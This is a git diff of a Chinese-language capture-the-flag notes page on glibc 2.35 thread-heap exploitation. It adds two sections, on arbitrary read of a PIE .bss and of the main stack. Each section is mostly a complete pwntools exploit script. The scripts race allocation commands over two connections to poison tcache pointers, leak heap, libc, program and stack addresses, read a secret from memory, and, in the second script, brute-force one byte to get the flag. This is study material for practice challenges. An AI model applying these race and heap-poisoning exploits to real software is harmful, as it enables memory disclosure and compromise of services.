@@ -10,6 +10,8 @@ comments: true
 - [0. glibc 2.35与 glibc 2.31的区别](#0-glibc-235与-glibc-231的区别)
 - [1. arbitrary read](#1-arbitrary-read)
   - [1.1 高版本内核泄露thread stack的方法](#11-高版本内核泄露thread-stack的方法)
+  - [1.2 任意地址读.bss(带pie)](#12-任意地址读bss带pie)
+  - [1.3 任意地址读main stack](#13-任意地址读main-stack)
 - [2. arbitrary write](#2-arbitrary-write)
 
 `thread heap的利用手法多数都是依靠race condition来获取任意地址读写的能力，辅以一些常见的tips即可完成利用`<br>
@@ -22,7 +24,7 @@ comments: true
 总之，`tcache->key`部分已经没有了价值，但是`tcache->next`部分非常有用。<br>
 
 # 1. arbitrary read<br>
-**利用arbitrary read可以任意读取.bss段（没有添加PIE）、Thread heap、Thread stack(主要利用第一个线程的栈空间与libc没有间隔)中的数据（前提是知道地址）**<br>
+**利用arbitrary read可以任意读取.bss段（没有添加PIE）、Thread heap、libc、Thread stack(主要利用第一个线程的栈空间与libc没有间隔)、main_stack、main_heap中的数据（前提是知道地址）**<br>
 race的利用难度主要在于调试（个人理解）<br>
 
 ```python
@@ -205,6 +207,212 @@ r1.recvuntil(b"Secret: ")
 r1.sendline(secret)
 output = r1.clean()
 print(output)
+p.interactive()
+```
+## 1.2 任意地址读.bss(带pie)<br>
+只需泄露stack上的program地址即可<br>
+```python
+import os
+from pwn import *
+#context.terminal = ['tmux','splitw','-h']
+binary_path = "/challenge/babyprime_level4.1"
+#binary_path = './babyprime_level4.1'
+p = process(binary_path)
+r1 = remote("127.0.0.1",1337)
+r2 = remote("127.0.0.1",1337)
+
+idx = 0
+def leak_pthread_addr(r1,r2):
+    global idx
+    while True:
+        if os.fork() == 0:
+            for _ in range(10000):
+                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
+            os.kill(os.getpid(),9)
+        for _ in range(10000):
+            r2.sendline(b"printf %d"%(idx))
+        os.wait()
+        r1.clean()
+        try:
+            output = r2.clean()
+            output = set(output.split(b'\n'))
+            print(output)
+            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
+            print(leak)
+            leak = u64(leak[9:17])
+            break
+        except Exception as e:
+            print(f"error: {e}")
+            print("try leak pthread_addr again")
+    idx += 1
+    return leak
+
+def arbitrary_read(r1,r2,addr):
+    global idx
+    r1.clean()
+    r2.clean()
+    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
+    while True:
+        if os.fork() == 0:
+            for _ in range(2000):
+                r1.sendline(b"malloc %d free %d"%(idx,idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
+        os.wait()
+        r1.sendline(b"malloc %d"% idx)
+        r1.sendline(b"printf %d"% idx)
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        #print("output:",output)
+        target = p64(addr).split(b"\x00")[0]
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.sendline(b"printf %d" %(idx+1))
+    r1.recvuntil(b"MESSAGE: ")
+    output = r1.recvline().strip(b"\n")
+    idx += 2
+    return output
+
+
+#gdb.attach(p,"continue\n")
+#pause()
+# step 1 : leak pthread heap addr
+pthread_addr = leak_pthread_addr(r1,r2)<<12
+log.success(f"pthread_addr: {hex(pthread_addr)}")
+
+# step 2 : leak libc addr
+libc_addr_ptr = pthread_addr + 0x8a0
+libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
+log.success(f"libc_addr: {libc_addr}")
+libc_addr = u64(libc_addr.ljust(8,b"\x00"))
+log.success(f"libc_addr: {hex(libc_addr)}")
+
+# step 3 : leak program addr
+main_addr_ptr = libc_addr - 0x21cce0
+log.success(f"main_addr_ptr: {hex(main_addr_ptr)}")
+main_addr = arbitrary_read(r1,r2,main_addr_ptr^((pthread_addr+0x1000)>>12))
+main_addr = u64(main_addr.ljust(8,b"\x00"))
+log.success(f"main_addr: {main_addr}")
+
+# step 4 : leak secret
+secret_addr = main_addr-0x2023 + 0x5370
+log.success(f"secret_addr: {hex(secret_addr)}")
+secret = arbitrary_read(r1,r2, secret_addr^((pthread_addr+0x2000)>>12))
+
+r1.clean()
+r1.sendline(b"send_flag")
+r1.recvuntil(b"Secret: ")
+r1.sendline(secret)
+output = r1.clean()
+print(output)
+p.interactive()
+```
+## 1.3 任意地址读main stack<br>
+原理很简单，泄露libc后，在里面找`main stack`的指针即可<br>
+```python
+import os
+from pwn import *
+#context.terminal = ['tmux','splitw','-h']
+binary_path = "/challenge/babyprime_level5.1"
+#binary_path = './babyprime_level5.1'
+p = process(binary_path)
+r1 = remote("127.0.0.1",1337)
+r2 = remote("127.0.0.1",1337)
+
+idx = 0
+def leak_pthread_addr(r1,r2):
+    global idx
+    while True:
+        if os.fork() == 0:
+            for _ in range(10000):
+                r1.sendline(b"malloc %d scanf %d aaaaaaaabbbbbbbb free %d"%(idx,idx,idx))
+            os.kill(os.getpid(),9)
+        for _ in range(10000):
+            r2.sendline(b"printf %d"%(idx))
+        os.wait()
+        r1.clean()
+        try:
+            output = r2.clean()
+            output = set(output.split(b'\n'))
+            print(output)
+            leak = next(x for x in output if ((b"\x07" in x) and len(x)>=17))
+            print(leak)
+            leak = u64(leak[9:17])
+            break
+        except Exception as e:
+            print(f"error: {e}")
+            print("try leak pthread_addr again")
+    idx += 1
+    return leak
+
+def arbitrary_read(r1,r2,addr):
+    global idx
+    r1.clean()
+    r2.clean()
+    r1.sendline(b"malloc %d malloc %d free %d free %d"%(idx,idx+1,idx,idx+1))
+    while True:
+        if os.fork() == 0:
+            for _ in range(2000):
+                r1.sendline(b"malloc %d free %d"%(idx,idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx) +p64(addr)+b"\n")*2000)
+        os.wait()
+        r1.sendline(b"malloc %d"% idx)
+        r1.sendline(b"printf %d"% idx)
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        #print("output:",output)
+        target = p64(addr).split(b"\x00")[0]
+        if output == target:
+            break
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.sendline(b"printf %d" %(idx+1))
+    r1.recvuntil(b"MESSAGE: ")
+    output = r1.recvline().strip(b"\n")
+    idx += 2
+    return output
+
+
+# gdb.attach(p,"continue\n")
+# pause()
+# step 1 : leak pthread heap addr
+pthread_addr = leak_pthread_addr(r1,r2)<<12
+log.success(f"pthread_addr: {hex(pthread_addr)}")
+
+# step 2 : leak libc addr
+libc_addr_ptr = pthread_addr + 0x8a0
+libc_addr = arbitrary_read(r1,r2,libc_addr_ptr^((pthread_addr+0x1000)>>12))
+log.success(f"libc_addr: {libc_addr}")
+libc_addr = u64(libc_addr.ljust(8,b"\x00"))
+log.success(f"libc_addr: {hex(libc_addr)}")
+
+#pause()
+# step 3 : leak stack addr
+stack_ptr = libc_addr + 0xda0
+log.success(f"stack_ptr: {hex(stack_ptr)}")
+stack_addr = arbitrary_read(r1,r2,stack_ptr^((pthread_addr+0x1000)>>12))
+stack_addr = u64(stack_addr.ljust(8,b"\x00"))
+log.success(f"stack_addr: {hex(stack_addr)}")
+
+
+# step 4 : leak secret
+secret_addr = stack_addr-0x128
+log.success(f"secret_addr: {hex(secret_addr)}")
+secret = arbitrary_read(r1,r2, secret_addr^((pthread_addr+0x2000)>>12))
+log.success(f"secret: {secret}")
+
+# step 5 : bruteforce
+for i in range(26):
+    payload = bytes([i+97])+secret
+    r1.clean()
+    r1.sendline(b"send_flag")
+    r1.recvuntil(b"Secret: ")
+    r1.sendline(payload)
+    output = r1.clean()
+    if b"pwn" in output:
+        print(output)
+        break
 p.interactive()
 ```
 
